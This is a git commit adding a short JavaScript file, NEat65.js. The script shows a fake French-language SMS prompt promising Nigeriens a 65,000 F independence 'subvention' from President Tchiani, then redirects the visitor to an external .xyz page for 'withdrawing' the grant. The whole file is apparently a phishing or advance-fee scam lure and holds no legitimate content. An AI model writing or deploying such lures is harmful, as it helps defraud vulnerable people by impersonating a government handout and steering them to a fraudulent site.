16dc25c3e9672f81d763ba9aeaf00acc5e616c90
bigetijazz32 <bigetijazz32@gmail.com>
2025-08-01 15:32:18 +0100

    Create NEat65.js

---
+++ NEat65.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 65,000F'
+password=prompt('SMS: bonjour mon cher, Demander une subvention de 65,000 F a l occasion de la fete de l independance du President TCHIANI aux Nigeriens. to RETIRER 65,000F, appuyez sur OK pour verifier maintenant','RETIRER 65,000F');
+if (password != 'RETIRER 65,000F') {
+location.href='https://www.udwang.xyz/retirer-NE-65000f-independence-grant';
+}
